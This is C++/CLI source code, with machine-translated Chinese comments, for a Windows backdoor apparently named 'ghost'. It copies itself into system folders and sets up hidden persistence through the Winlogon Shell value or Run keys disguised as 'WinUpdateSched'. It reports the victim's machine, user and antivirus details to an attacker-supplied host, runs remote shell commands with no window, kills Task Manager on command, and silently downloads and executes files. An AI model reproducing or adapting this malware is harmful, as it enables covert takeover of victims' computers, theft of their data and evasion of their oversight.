/*
	@title
		ghost
	人：yanling ruan
       nic-hdl：YR194-AP
       电子邮件：sh-ipmaster@chinaunicom.cn
       地址：上海市浦东大道900号
       电话：+ 086-021-61201616
       传真号码：+ 086-021-61201616
       国家：cn
*/
//=======================================================
#define						GHOSTVER						"1.0.3b"
#define						DEFAULT_BUFF					19056
#define						TMPLOG							"svchost.log"

// 64位自动重定向到“HKLM \ SOFTWARE \ Wow6432Node”
#define						KEY_TARGET						HKEY_LOCAL_MACHINE 
#define						KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
#define						KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_ROOT_STARTUP				"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
#define						KEY_VALUE_NAME					"WinUpdateSched"
#define						KEY_SHELL_NAME					"Shell"

#include					"ahxrwinsock.h"
#include					"resource.h"
#include					"json.hpp"
#include					"info.h"
#include					"encrypt.h"

#include					<Shellapi.h>
#include					<Lmcons.h>
#include					<fstream>

using namespace				std;
using namespace				System::Runtime::InteropServices;
using						json = nlohmann::json;

PCSTR						str_host;
PCSTR						str_port;
TCHAR						str_temp[MAX_PATH];
TCHAR						str_windows[MAX_PATH];
char						c_temp_cmd[ MAX_PATH + 20 ];
char						c_cmd_dir[MAX_PATH + 7];
bool						b_cmd;
bool						b_taskmgr;
HANDLE						h_payload;
AHXRCLIENT					client;

void						onClientConnect();
void						onClientRecData( char * data);
DWORD WINAPI				t_ping(LPVOID lpParams);
DWORD WINAPI				t_payloads(LPVOID lpParams);


#pragma comment				(lib, "shell32.lib")
#pragma comment				(lib, "Advapi32.lib")
#pragma comment				(lib, "Wininet.lib")

void main(cli::array<System::String^>^ args)
{
	if (args->Length < 2) // IP and Port;
		exit(EXIT_FAILURE);

	// 字符串到PCSTR（const char *）
	str_host = (const char * ) Marshal::StringToHGlobalAnsi(args[0]).ToPointer();
	str_port = (const char * ) Marshal::StringToHGlobalAnsi(args[1]).ToPointer();

#ifndef GHOST_HIDE
	HMODULE			h_mod;
	char *			c_path[MAX_PATH];
	char 			c_new_path[MAX_PATH + FILENAME_MAX + 1];
	string			s_path;
	string			s_file_name;
	bool			b_admin_access;

	h_mod = GetModuleHandleW(NULL);
	GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);

	s_path = (char *)c_path;
	s_file_name = s_path.substr(s_path.find_last_of('\\') + 1); // Getting the file name.
	s_path = s_path.substr( 0, s_path.find_last_of('\\')); // Just the path of the executed location.

	GetTempPath(MAX_PATH, str_temp); // Temp path for returning cmd response.
	GetSystemDirectory(str_windows, MAX_PATH);  // Looking for cmd.exe

	if (strcmp(s_path.c_str(), str_windows) != 0 && ( strcmp( string(string(s_path) + "\\").c_str(), str_temp) != 0 )) {
		sprintf(c_new_path, "%s\\%s", str_windows, s_file_name.c_str());

		fstream f_file_read((char *)c_path, ios::in | ios::binary);
		fstream f_file_write(c_new_path, ios::out | ios::binary);
		
		if (f_file_write.good() || f_file_write.is_open()) { // No permission
			f_file_write << f_file_read.rdbuf();

			f_file_read.close();
			f_file_write.close();
		}
		else {
			sprintf(c_new_path, "%s%s", str_temp, s_file_name.c_str());
			fstream f_file_write(c_new_path, ios::out | ios::binary);

			f_file_write << f_file_read.rdbuf();

			f_file_read.close();
			f_file_write.close();
		}

		char paramFormat[ 23 ];
		sprintf(paramFormat, "%s %s", str_host, str_port);

		ShellExecute(NULL, "open", c_new_path, paramFormat, 0, 0);
		exit(EXIT_SUCCESS);
	}

	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);

	remove(c_temp_cmd); // Remove previous instance.

	/*
试图加入Shell初创公司。 这就是僵尸在安全模式中运行的原因。
此应用程序还将从启动时隐藏此应用程序。
节目。
	*/
	HKEY h_key;
	long l_key;
	bool b_good;

	l_key = RegOpenKeyEx(KEY_TARGET, KEY_ROOT_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

	if (l_key == ERROR_SUCCESS) {
		char * full_path = new char[MAX_PATH + 50];
		sprintf(full_path, "explorer.exe,\"%s %s %s\"", c_path, str_host, str_port);
		long l_set_key = RegSetValueEx(h_key, KEY_SHELL_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);

		if (l_set_key == ERROR_SUCCESS)
			b_good = true;

		RegCloseKey(h_key);
	}

	if (!b_good) {
		//添加到启动，因为我们无法使用Shell启动。
		l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

		//没有管理员权限 只需让用户启动即可。
		if (l_key == ERROR_ACCESS_DENIED) {
			l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
			b_admin_access = true;
		}

		if (l_key == ERROR_SUCCESS) {
			char * full_path = new char[MAX_PATH + 50];
			sprintf(full_path, "\"%s\" %s %s", c_path, str_host, str_port);

			RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
			RegCloseKey(h_key);
		}
	}

	SetFileAttributes((char *)c_path, FILE_ATTRIBUTE_HIDDEN);
#else
	GetTempPath(MAX_PATH, str_temp); //返回cmd响应的临时路径
	GetSystemDirectory(str_windows, MAX_PATH);  //寻找cmd.exe

	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);
#endif

	h_payload = CreateThread(NULL, NULL, &t_payloads, 0, 0, 0);

	//启动和空闲服务器
	while (1) {
		if( client.init(str_host, str_port, TCP_SERVER, onClientConnect) ) 
			client.listen(onClientRecData, false);

		if (client.Socket_Client != INVALID_SOCKET)
			closesocket(client.Socket_Client);

		b_cmd = false; // 安全重置
		Sleep(1000);
	}
}

DWORD WINAPI t_payloads(LPVOID lpParams) {
	while (1) {
		if (b_taskmgr) {
			DWORD d_task = FindProcessId(L"taskmgr.exe");
			if (d_task != 0) {
				HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, TRUE, d_task);
				TerminateProcess(h_process, 1);
			}
		}
		
		Sleep(100);
	}
}

DWORD WINAPI t_ping(LPVOID lpParams) {
	while (1) {
		Sleep(3000);
		char buf;
		int err = recv(client.Socket_Client, &buf, 1, MSG_PEEK);
		if (err == SOCKET_ERROR)
		{
			if (WSAGetLastError() != WSAEWOULDBLOCK)
			{
				client.close();
				break;
			}
		}
	}
	return 0;
}

void onClientConnect() {
	json			sys_data;
	TCHAR			c_comp_name[ MAX_COMPUTERNAME_LENGTH + 1 ];
	DWORD			c_comp_size;
	DWORD			c_username_size = UNLEN + 1;
	char			c_username[UNLEN + 1];
	
	c_comp_size		= sizeof(c_comp_name);
	GetComputerName(c_comp_name, &c_comp_size);
	GetUserName(c_username, &c_username_size);


	sys_data["ID"] = c_comp_name;
	sys_data["USER"] = c_username;
	sys_data["IP"] = real_ip();
	sys_data["PORT"] = str_port;
	sys_data["AV"] = getAntivirus();
	sys_data["VERSION"] = GHOSTVER;

	OSVERSIONINFO vi;
	vi.dwOSVersionInfoSize = sizeof(vi);

	string os_output = "Unknown"; 
	if (GetVersionEx(&vi) != 0) {
		switch (vi.dwMajorVersion) {
			case 10: {
				os_output = "Windows 10";
				break;
			}
			case 6: {
				if (vi.dwMinorVersion == 3)
					os_output = "Windows 8.1";
				else if (vi.dwMinorVersion == 2)
					os_output = "Windows 8";
				else if (vi.dwMinorVersion == 1)
					os_output = "Windows 7";
				else
					os_output = "Windows Vista";
				break;
			}
			case 5: {
				if (vi.dwMinorVersion == 2)
					os_output = "Windows Server 2003 R2";
				else if (vi.dwMinorVersion == 1)
					os_output = "Windows XP";
				else if (vi.dwMinorVersion == 0)
					os_output = "Windows 2000";
				break;
			}
			default: {
				os_output = "Unknown";
				break;
			}
		}

#ifdef _WIN32
		os_output += " 32-bit";
#elif _WIN64
		os_output += " 64-bit";
#endif
	}
	sys_data["OS"] = os_output;

	client.send_data(encryptCMD(sys_data.dump()).c_str());

	CreateThread(0, 0, t_ping, 0, 0, 0);
}

void onClientRecData( char * data ) {

	// R加密加密。
	if (strcmp(data, "CMD") != 0) {
		string s_data = data;
		s_data = unencryptCMD(s_data);
		strcpy(data, s_data.data());
	}
	
	int i_len			= strlen(data) + MAX_PATH + 1;
	char * c_output		= new char[i_len];
	char * c_new_data	= new char[strlen(data) + 1];
	bool b_skip = false;;

	strcpy(c_new_data, data);
	c_output[i_len - 1] = '\0';

	/*fstream f_test("debug.txt", ios::out | ios::binary);
	f_test << c_new_data;
	f_test.close();
	*/

	/*
		关键字“ghost_ping”用于确定套接字是否为
是否有效。 任何简单地“ghost_ping”的数据都将被忽略。
	*/
	if (!strcmp(c_new_data, "ghost_ping"))
		b_skip = true;

	if (!strcmp(c_new_data, "ghost_tskmgr")) {
		b_taskmgr = !b_taskmgr;
		client.send_data(encryptCMD(string(b_taskmgr ? "Task Manager Killer Enabled" : "Task Manager Killer Disabled")).c_str());
		b_skip = true; // 通过使用魔法关键字进行无效
	}

	// b_skip法令
	if ( !b_skip ) {
		if (!strcmp(c_new_data, "CMD")) // 切换命令提示响应 
			b_cmd = !b_cmd;
		else {
			if (b_cmd) {

				int				i_length;
				fstream			f_response;

				sprintf(c_output, "/C %s > %s", c_new_data, c_temp_cmd);

				/*
					在没有窗口的情况下运行命令。 使用WinExec，系统或ShellExecute将使
随机命令提示符弹出窗口。 这将是一件事
在背景中，这是“幽灵”的重点。
				*/
				STARTUPINFO info = { sizeof(info) };
				PROCESS_INFORMATION processInfo;
				if (CreateProcess(c_cmd_dir, c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo)) {
					WaitForSingleObject(processInfo.hProcess, 5000);
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}

				/*
					在c_output中，右胡萝卜符号将输出写入文件。 在这里，我们要去
将此文件读回服务器。 这是服务器知道什么
他们的命令发生了。

某些命令将不返回任何响应，这很好。 但是，据我所知，
无效的命令。
				*/
				f_response.open(c_temp_cmd, ios::in | ios::binary);

				f_response.seekg(0, f_response.end);
				i_length = (int)f_response.tellg();
				f_response.seekg(0, f_response.beg);

				if (i_length > 0) {
					char * c_read = new char[i_length];
					f_response.read(c_read, i_length);

					// 空终止。 如果没有这个，数据结尾会有一个胡言乱语。
					c_read[i_length] = '\0';
					if (c_read[i_length - 1] == '\n')
						c_read[i_length - 1] = '\0';

					client.send_data(encryptCMD( string( c_read ) ).c_str());
				}
				else
					client.send_data(encryptCMD(string("Invalid command or empty response.")).c_str());

			}

			// “下载并执行”
			if (!b_cmd && strcmp(c_new_data, "CMD") != 0) {
				HRSRC			hr_res;
				DWORD32			dw_res;
				LPVOID			lp_res;
				LPVOID			lp_res_lock;

				// 创建wget文件。
				hr_res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
				dw_res = ::SizeofResource(NULL, hr_res);
				lp_res = LoadResource(NULL, hr_res);
				lp_res_lock = LockResource(lp_res);

				fstream f_wget("wget.exe", ios::out | ios::binary);
				f_wget.write((char *)lp_res, dw_res);
				f_wget.close();

				SetFileAttributes("wget.exe", FILE_ATTRIBUTE_HIDDEN);

				// 获取已发送的数据。
				json j_response = json::parse(c_new_data);
				sprintf(c_output, "/C wget %s -O %s", j_response["URL"].get<string>().c_str(), j_response["FILE"].get<string>().c_str());
	
				// 在后台运行wget.exe。 也隐藏命令提示符。 无声下载。
				STARTUPINFO info = { sizeof(info) };
				PROCESS_INFORMATION processInfo;
				if (CreateProcess("wget.exe", c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo))
				{
					WaitForSingleObject(processInfo.hProcess, INFINITE);
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}

				char c_dir[MAX_PATH];
				string s_dir;
				GetModuleFileName(NULL, c_dir, MAX_PATH);

				string::size_type pos = string(c_dir).find_last_of("\\/");
				s_dir = string(c_dir).substr(0, pos);

				sprintf(c_output, "%s has downloaded and saved at: %s\\%s\nNow executing...",
					j_response["URL"].get<string>().c_str(),
					s_dir.c_str(),
					j_response["FILE"].get<string>().c_str()
					);

				client.send_data(encryptCMD(string(c_output)).c_str());

				// 运行下载的文件并删除wget.exe
				ShellExecute(NULL, "open", j_response["FILE"].get<string>().c_str(), 0, 0, 0);
				remove("wget.exe");
			}
		}
	}
}
